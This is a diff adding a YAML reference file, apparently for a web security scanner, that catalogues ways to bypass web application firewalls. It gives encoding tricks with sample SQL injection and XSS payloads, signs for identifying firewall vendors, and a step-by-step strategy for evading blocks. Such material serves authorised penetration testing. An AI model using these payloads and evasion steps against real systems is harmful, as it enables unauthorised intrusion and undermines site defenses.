@@ -1,0 +1,92 @@
+id: waf-bypass-techniques
+title: "WAF Bypass Techniques"
+category: detection
+description: "Encoding and evasion strategies for bypassing Web Application Firewalls"
+version: "1.0"
+
+techniques:
+  encoding_chains:
+    - name: "Double URL encoding"
+      description: "Encode special chars twice: ' -> %27 -> %2527"
+      examples:
+        - "%2527 OR 1=1--"
+        - "%253Cscript%253E"
+      effective_against: ["ModSecurity", "AWS WAF", "Cloudflare"]
+
+    - name: "Unicode normalization"
+      description: "Replace ASCII with full-width Unicode equivalents"
+      examples:
+        - "\uFF1Cscript\uFF1Ealert(1)\uFF1C/script\uFF1E"
+        - "\uFF07 OR 1=1--"
+      effective_against: ["basic filters"]
+
+    - name: "SQL comment injection"
+      description: "Break keywords with inline SQL comments"
+      examples:
+        - "UN/**/ION SEL/**/ECT"
+        - "1'/**/OR/**/1=1--"
+      effective_against: ["ModSecurity CRS", "keyword filters"]
+
+    - name: "Case alternation"
+      description: "Alternate upper/lower case to bypass case-sensitive rules"
+      examples:
+        - "SeLeCt"
+        - "<ScRiPt>alert(1)</ScRiPt>"
+      effective_against: ["case-sensitive filters"]
+
+    - name: "Hex encoding (SQL)"
+      description: "Hex-encode string literals in SQL context"
+      examples:
+        - "0x61646d696e (admin)"
+        - "CHAR(97,100,109,105,110)"
+      effective_against: ["string matching WAFs"]
+
+    - name: "HTML entity encoding"
+      description: "Use numeric or named HTML entities"
+      examples:
+        - "&#60;script&#62;alert(1)&#60;/script&#62;"
+        - "&#x3c;img src=x onerror=alert(1)&#x3e;"
+      effective_against: ["XSS filters"]
+
+    - name: "Null byte insertion"
+      description: "Insert %00 between characters to break pattern matching"
+      examples:
+        - "sel%00ect"
+        - "<scr%00ipt>"
+      effective_against: ["byte-level filters"]
+
+    - name: "Chunked transfer encoding"
+      description: "Split payload across HTTP chunks"
+      application: "HTTP/1.1 Transfer-Encoding: chunked"
+      effective_against: ["request-level filters"]
+
+  detection_signals:
+    waf_present:
+      - "403 Forbidden with security-related body"
+      - "406 Not Acceptable"
+      - "429 Too Many Requests"
+      - "Response header: X-CDN, X-Cache, CF-Ray"
+      - "Response header: Server containing WAF names"
+
+    waf_vendors:
+      - name: "Cloudflare"
+        headers: ["CF-RAY", "cf-cache-status"]
+        error_page: "Attention Required! | Cloudflare"
+      - name: "AWS WAF"
+        headers: ["x-amzn-RequestId"]
+        error_page: "Request blocked"
+      - name: "ModSecurity"
+        headers: ["X-Mod-Security"]
+        error_page: "ModSecurity"
+      - name: "Akamai"
+        headers: ["X-Akamai-Transformed"]
+        error_page: "Access Denied"
+
+  evasion_strategy: >
+    When 3+ consecutive 403/429 responses are detected:
+    1. Add 500ms delay between requests
+    2. Rotate User-Agent header
+    3. Apply double URL encoding to payloads
+    4. Use comment injection for SQL payloads
+    5. Use case alternation for XSS payloads
+    6. If still blocked, switch to time-based blind detection
